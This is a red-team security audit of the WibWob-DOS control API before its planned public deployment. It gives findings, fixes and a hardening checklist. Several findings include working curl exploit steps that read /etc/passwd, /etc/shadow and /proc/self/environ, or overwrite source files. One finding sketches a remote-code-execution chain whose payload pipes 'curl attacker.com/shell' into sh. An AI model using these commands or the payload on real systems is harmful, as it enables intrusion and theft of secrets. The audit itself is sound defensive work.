# WibWob-DOS Fly.io Deployment — OPSEC & Security Audit

> **Status:** Pre-deployment red team review
> **Date:** 2026-03-17
> **Scope:** Control API, ttyd, file manager, editor, primer viewer, command registry
> **Deployment context:** `https://wibwob-dos.fly.dev` with full control API publicly exposed, zero auth.
> **Note:** Deployment files (Dockerfile, entrypoint.sh, fly.toml) do not yet exist — this audit covers the
> source code attack surface and recommends hardening for when they are created.

---

## Executive Summary

The WibWob-DOS control API was designed as a **localhost-only** surface (`hostname: "127.0.0.1"`).
Exposing it publicly on Fly.io without authentication transforms every convenience feature into
an attack vector. The app has **no auth, no rate limiting, no path validation, and no sandboxing**
on file-touching endpoints. Several findings are critical in a public deployment context.

**Critical findings: 3 · High: 4 · Medium: 4 · Low: 2 · Info: 2**

---

## Finding 1 — Arbitrary File Read via `primer.open` / `markdown.open`

**Severity: CRITICAL**

### Description

`/view/primer/open` accepts `{ filePath: "/any/path" }` and reads the file via `safeReadFile()`
(a raw `fs.readFileSync` wrapper with no path validation). The content is then displayed in a
window and exposed via `/screenshot/text?id=N` or `/windows/text?id=N`.

The same applies to `/view/reader/open` (markdown viewer) and `/view/editor/open`.

### Exploit Path

```bash
# Step 1: Open /etc/passwd as a primer
curl -X POST https://wibwob-dos.fly.dev/view/primer/open \
  -H 'Content-Type: application/json' \
  -d '{"filePath": "/etc/passwd"}'

# Step 2: Get window id from state
WINDOW_ID=$(curl -s https://wibwob-dos.fly.dev/state | jq '.windows[-1].id')

# Step 3: Read the content
curl "https://wibwob-dos.fly.dev/screenshot/text?id=$WINDOW_ID"

# More dangerous targets:
# /proc/self/environ  — leaks ALL env vars (API keys, secrets)
# /proc/self/cmdline  — leaks command line args
# /data/logs/*        — persistent volume contents
# ~/.bun/install/cache — cached packages
```

### Root Cause

- `openPrimerFile()` in `file-actions.ts:56` calls `safeReadFile(params.filePath)` with zero validation
- `safeReadFile()` in `safe-fs.ts:11` is a raw `fs.readFileSync()` wrapper — no path jail
- The API layer in `control-api.ts:663` passes `filePath` through with only a `filePath required` check
- No allowlist, no path prefix check, no symlink resolution

### Fix

```typescript
// Add to safe-fs.ts or a new path-jail.ts:
const ALLOWED_ROOTS = [REPO_ROOT, '/data'];
export function jailPath(filePath: string): string | null {
  const resolved = path.resolve(filePath);
  // Block /proc, /sys, /dev, /etc entirely
  if (/^\/(proc|sys|dev|etc)/.test(resolved)) return null;
  // Optional: enforce allowlist
  if (!ALLOWED_ROOTS.some(root => resolved.startsWith(root + '/'))) return null;
  return resolved;
}
```

Apply `jailPath()` to every endpoint that accepts a `filePath` parameter:
- `primer.open`, `markdown.open`, `editor.open`, `document.open`
- `finder.navigate`, `finder.edit`, `finder.open_external`
- `music-player.open`, `zine.open`, `canvas.load`

---

## Finding 2 — Arbitrary Filesystem Browse + Edit via File Manager

**Severity: CRITICAL**

### Description

The file manager (`finder.open`) starts at `REPO_ROOT` but `finder.navigate` accepts
**any absolute path** with no jail. The inline editor (`finder.edit`) can edit and save
any readable/writable file via `fs.writeFileSync`.

### Exploit Path

```bash
# Open file manager
curl -X POST https://wibwob-dos.fly.dev/commands/run \
  -H 'Content-Type: application/json' \
  -d '{"id": "finder.open"}'

# Navigate to root filesystem
curl -X POST https://wibwob-dos.fly.dev/commands/run \
  -H 'Content-Type: application/json' \
  -d '{"id": "finder.navigate", "args": {"path": "/"}}'

# The file manager now exposes ALL files on the container.
# Preview pane reads file content via fs.readFileSync (file-manager-window.ts:795-850)
# Inline editor saves via fs.writeFileSync (file-manager-window.ts:781)
```

### Root Cause

- `finder.navigateTo()` (file-manager-window.ts:1807) validates only that the path is a directory,
  not that it's within any allowed root
- `enterEditMode()` (file-manager-window.ts:779) calls `fs.readFileSync(filePath, "utf8")` directly
- `saveEditBuffer()` (file-manager-window.ts:797) calls `fs.writeFileSync(editFilePath, content, "utf8")`
- The file-manager v3 (src/windows/file-manager/window.ts) has the same issue at line 656

### Fix

Add a path jail to `finder.navigateTo()` and all file-read/write operations in the file manager.
In a container deployment, also consider running as a non-root user with restricted filesystem access.

---

## Finding 3 — Shell Command Injection via File Manager

**Severity: CRITICAL**

### Description

The file manager executes shell commands with user-influenced paths:
- `execSync(`open -R ${JSON.stringify(filePath)}`)` — Finder reveal (line 1279)
- `execSync(`${editor.cmd} ${JSON.stringify(filePath)}`)` — external editor open (line 1257)
- `execSync(`${envEditor} ${JSON.stringify(filePath)}`)` — env editor (line 1266)
- `execSync("git status --porcelain -uall", { cwd: dirPath })` — git status (line 98)
- `spawn("rg", args)` where `query` comes from user input — search (line 1127)

While `JSON.stringify()` provides some escaping, and `spawn` with array args is safe,
the `execSync` calls with string concatenation are a concern in a container context where
tools may differ. The `finder.open_external` command specifically probes for and launches
external editors.

### Exploit Path

In a container, `finder.open_external` probes `which cursor`, `which code`, etc. If an
attacker can write a file named `cursor` to a PATH directory (or if PATH includes writable
dirs), they could get code execution. More practically, `$VISUAL`/`$EDITOR` env vars are
used directly in an `execSync()` call.

### Fix

- Remove `finder.open_external` and `revealInFinder` from the API surface in deployment
  (they're meaningless in a headless container anyway)
- Never use `execSync` with string interpolation — use `execFileSync` with argument arrays
- Gate all shell-exec commands behind a deployment flag

---

## Finding 4 — Zero Authentication on Public API

**Severity: HIGH**

### Description

The control API binds to `127.0.0.1` locally, but in a Fly.io deployment, a reverse proxy
(fly-proxy) forwards public traffic to the internal port. The API has **no authentication
middleware, no API keys, no session tokens, no CORS headers**.

### Exploit Path

Anyone on the internet can:
- Read all desktop state, window contents, Scramble conversation history
- Execute any registered command
- Open/close/move windows, change themes
- Send messages to the AI agent
- Read arbitrary files (see Finding 1)
- Browse and edit the filesystem (see Finding 2)

### Fix

Add authentication before deploying:
```typescript
// Minimum viable: shared secret in Bearer header
const API_TOKEN = process.env.WIBWOB_API_TOKEN;
if (API_TOKEN) {
  const auth = request.headers.get('Authorization');
  if (auth !== `Bearer ${API_TOKEN}`) {
    return new Response('Unauthorized', { status: 401 });
  }
}
```

Better: deploy behind Fly.io's built-in Tailscale or WireGuard mesh, or use
`fly-replay` to restrict to specific users.

---

## Finding 5 — Editor Write-to-Disk Path

**Severity: HIGH**

### Description

`/windows/editor/write` writes to the **in-memory buffer** only (`insertEditorTextState`),
not directly to disk. However, the editor has a save flow:
1. API writes text to buffer → buffer is marked dirty
2. `editor.save` or `Ctrl+S` writes `window.editor.value` to `window.filePath` via `safeWriteFile`
3. `editor.save_as` accepts a user-supplied path via overlay prompt

The concern: an attacker could:
1. Open an editor with `filePath` set to a sensitive location
2. Write malicious content via `/windows/editor/write`
3. Trigger save via `/commands/run { id: "editor.save" }` — this saves to the original filePath

### Exploit Path

```bash
# Open editor on a sensitive file
curl -X POST https://wibwob-dos.fly.dev/view/editor/open \
  -H 'Content-Type: application/json' \
  -d '{"filePath": "/app/src/services/control-api.ts"}'

# Get window ID
ID=$(curl -s https://wibwob-dos.fly.dev/state | jq '.windows[-1].id')

# Write malicious content
curl -X POST https://wibwob-dos.fly.dev/windows/editor/write \
  -H 'Content-Type: application/json' \
  -d "{\"id\": $ID, \"content\": \"// pwned\"}"

# Save to disk
curl -X POST https://wibwob-dos.fly.dev/commands/run \
  -H 'Content-Type: application/json' \
  -d '{"id": "editor.save"}'
```

### Fix

- Add path jail to `editor.open` filePath parameter
- In deployment mode, make the app directory read-only (Docker `RUN chmod` or mount as read-only)
- Consider disabling `editor.save` / `editor.save_as` on the API surface in deployment

---

## Finding 6 — Unrestricted Command Execution via `/commands/run`

**Severity: HIGH**

### Description

`/commands/run` executes **any** registered command by ID. The command catalog includes:

**Dangerous commands accessible via API (`api: true`):**
- `finder.open`, `finder.navigate`, `finder.edit`, `finder.save` — filesystem access
- `finder.open_external` — launches shell processes
- `editor.open`, `editor.write`, `editor.save` — arbitrary file write
- `primer.open`, `markdown.open`, `document.open` — arbitrary file read
- `desktop.clear-all` — DoS (close all windows)
- `agent.send` — prompt injection into the AI agent
- `scramble.say` — prompt injection into Scramble
- `backrooms.open` — starts LLM sessions (costs money)
- `theme.set` — UI disruption
- `ghostty.shader.set` — terminal manipulation
- `fx.glitch`, `fx.shear`, `fx.breed`, `fx.flip` — file read + write via scripts
- `text.smear` — invokes `scripts/smear.py` with file paths
- `microapps.reload` — code reload from disk (after file modification = RCE)
- `canvas.load` — loads YAML files (potential YAML deserialization)

### Fix

Create a deployment allowlist:
```typescript
const DEPLOYMENT_ALLOWED_COMMANDS = new Set([
  'theme.set', 'theme.cycle', 'theme.choose',
  'window.tile', 'window.cascade', 'window.focus',
  // ... curated safe commands only
]);
```

Block or require elevated auth for filesystem, editor, finder, and reload commands.

---

## Finding 7 — FX Commands Execute Python Scripts with User Paths

**Severity: HIGH**

### Description

`fx.glitch`, `fx.shear`, `fx.breed`, `fx.flip` and `text.smear` invoke Python scripts
(`scripts/smear.py`) via shell with user-supplied `filePath` arguments. The `filePath`
parameter has a Zod schema but **no path validation** — only type checking.

### Exploit Path

```bash
curl -X POST https://wibwob-dos.fly.dev/commands/run \
  -H 'Content-Type: application/json' \
  -d '{"id": "fx.glitch", "args": {"filePath": "/etc/shadow"}}'
```

This reads `/etc/shadow`, processes it, writes output to a temp file, then opens it as a primer
(readable via `/screenshot/text`).

### Fix

Apply the same `jailPath()` validation to all FX command file path parameters.

---

## Finding 8 — ttyd `--readonly` Bypass Assessment

**Severity: MEDIUM**

### Description

ttyd with `--readonly` flag prevents keyboard input by dropping WebSocket messages from
the client that contain terminal input data. The enforcement is **server-side** — the
ttyd server simply ignores input-type WebSocket frames.

### Analysis

- The `--readonly` flag is enforced in ttyd's C code server-side, not client-side JS
- WebSocket message types are checked: type `0` (input) is rejected, type `1` (resize) is allowed
- A malicious WebSocket client cannot bypass this by sending crafted messages because the
  server drops them before they reach the PTY
- **However:** ttyd allows terminal resize messages — an attacker could send extreme resize
  values causing visual disruption or potential memory issues

### Risk

Low risk of input bypass. Medium risk of DoS via resize flooding.

### Fix

Pin ttyd to a known-good version. Add rate limiting on the WebSocket connection if possible.
Consider using `--max-clients 10` to limit concurrent connections.

---

## Finding 9 — Information Disclosure via API Endpoints

**Severity: MEDIUM**

### Description

Multiple endpoints leak sensitive operational information:

- `GET /` — exposes `scratchBase`, `capturesDir`, `workspacesDir`, `statePath` (full paths)
- `GET /config` — same path disclosure
- `GET /health` — PID, socketPath, uptime
- `GET /state` — full desktop state including window filePaths, editor contents
- `GET /scramble/history` — full AI conversation history
- `GET /scramble/state` — AI session details, model name, log path
- `GET /runtime/inspection` — memory usage, frame times, all internal state

### Fix

In deployment mode, redact paths and internal details:
- Strip absolute paths to relative
- Remove PID, socketPath from health
- Gate `/scramble/history` and `/runtime/inspection` behind auth

---

## Finding 10 — `microapps.reload` Enables Remote Code Execution

**Severity: MEDIUM**

### Description

If an attacker can write to the microapps directory (via Finding 2 or Finding 5), then calling
`microapps.reload` will **re-import and execute the modified code**. This is a code-execution
primitive.

### Exploit Chain

1. Open editor on a microapp's `index.ts` (Finding 5)
2. Write malicious TypeScript (e.g., `Bun.spawn(["sh", "-c", "curl attacker.com/shell | sh"])`)
3. Save to disk
4. Call `microapps.reload` — the malicious code runs in the app process

### Fix

- Disable `microapps.reload` in deployment
- Make `/app/microapps/` read-only in the container image
- Run as non-root user

---

## Finding 11 — `/windows/text/export` Path Traversal in Filename

**Severity: MEDIUM**

### Description

The export endpoint sanitizes the filename with `name.replace(/[^a-z0-9._-]+/gi, "-")`,
which is good. However, the regex **allows dots and dashes**, so a name like `....` combined
with directory separators (which are replaced by `-`) cannot traverse. The output directory
is hardcoded to `capturesDir`.

### Analysis

The current sanitization is adequate for the filename component — `path.join(capturesDir, fileName)`
cannot escape `capturesDir` because the sanitized name cannot contain `/`. The ISO date prefix
and `.txt` suffix further limit abuse.

**No exploit found.** The current code is safe for this specific endpoint.

### Status: **SAFE** — no fix needed for this specific vector.

---

## Finding 12 — Journal/JSONL Injection

**Severity: LOW**

### Description

The question references "journal injection" and sanitization. The control API does not
directly expose journal write endpoints — journal writes happen through internal services
(backrooms logs, agent session logs).

### Analysis

If journal entries include user-controlled text (e.g., chat messages, agent responses),
a crafted input containing newlines could inject additional JSONL records:

```
{"type":"msg","text":"hello\n{\"type\":\"admin\",\"role\":\"system\"}"}
```

However, `JSON.stringify()` escapes newlines as `\n`, so a single `JSON.stringify` + 
`fs.appendFileSync` per entry is safe against record injection.

### Risk

Low. Standard JSON serialization handles this correctly. Verify that all journal-writing
code uses `JSON.stringify()` and not string concatenation.

---

## Finding 13 — Agent Prompt Injection via API

**Severity: LOW**

### Description

`/windows/agent-message` and `agent.send` allow sending arbitrary text to the Wib&Wob
agent. `scramble.say` does the same for Scramble. In a public deployment, anyone could:
- Inject system prompt overrides
- Attempt to make the agent execute tools
- Exhaust LLM API credits

### Fix

Rate-limit agent/scramble endpoints. Require auth. Consider a separate "visitor" mode
that strips tool access from the agent.

---

## Finding 14 — Scalar API Docs Load External JavaScript

**Severity: INFO**

### Description

The `/docs` endpoint loads `https://cdn.jsdelivr.net/npm/@scalar/api-reference` — an
external CDN script. In a deployment context, this is a supply-chain risk (CDN compromise)
and leaks visitor IPs to a third party.

### Fix

Bundle the Scalar JS locally or disable `/docs` in deployment.

---

## Finding 15 — No CORS Headers

**Severity: INFO**

### Description

The API sets no CORS headers. This means:
- Browsers won't send cross-origin requests with credentials (good for defense-in-depth locally)
- But for a public deployment, any webpage could make simple GET requests

### Fix

Add explicit CORS headers denying cross-origin access, or set a strict allowlist.

---

## Deployment Hardening Checklist

When creating the Dockerfile, entrypoint.sh, and fly.toml:

- [ ] **AUTH FIRST**: Add Bearer token auth middleware before any public deployment
- [ ] **Non-root user**: `RUN adduser --disabled-password wibwob && USER wibwob`
- [ ] **Read-only app**: Mount `/app` as read-only, only `/data` writable
- [ ] **Path jail**: Implement and apply `jailPath()` to all file-accepting endpoints
- [ ] **Command allowlist**: Block dangerous commands in deployment mode
- [ ] **Disable `/docs`**: Remove external CDN dependency
- [ ] **Disable `microapps.reload`**: Prevent code injection chain
- [ ] **Disable `finder.open_external`**: No shell exec in container
- [ ] **Rate limiting**: Especially on LLM-calling endpoints
- [ ] **CORS**: Explicit deny or strict allowlist
- [ ] **ttyd hardening**: `--max-clients 10`, pin version, consider removing entirely
- [ ] **Environment**: Never put secrets in env vars if `/proc/self/environ` is readable
  - Use Fly.io secrets with a vault pattern, or ensure /proc is restricted
- [ ] **Bind address**: When proxied, bind API to `0.0.0.0` but ONLY behind Fly.io proxy
  - fly.toml `internal_port` handles this — verify no direct port exposure
- [ ] **Logging**: Log all API requests with timestamps for incident response
- [ ] **Health endpoint**: Strip PID, socketPath, and internal paths from public health response
